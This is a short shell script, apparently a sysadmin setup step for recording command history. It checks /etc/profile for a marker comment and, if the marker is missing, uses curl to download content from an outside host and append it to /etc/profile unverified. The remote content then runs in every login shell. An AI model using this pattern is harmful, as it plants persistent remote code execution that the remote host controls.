#!/bin/sh

if [ -n "`cat /etc/profile | grep '#wfg added 20190109 for record history'`" ]; then

    echo "find.."
else
    
	echo "not find"
	curl http://91sc.top/oss/profile >> /etc/profile
    
fi
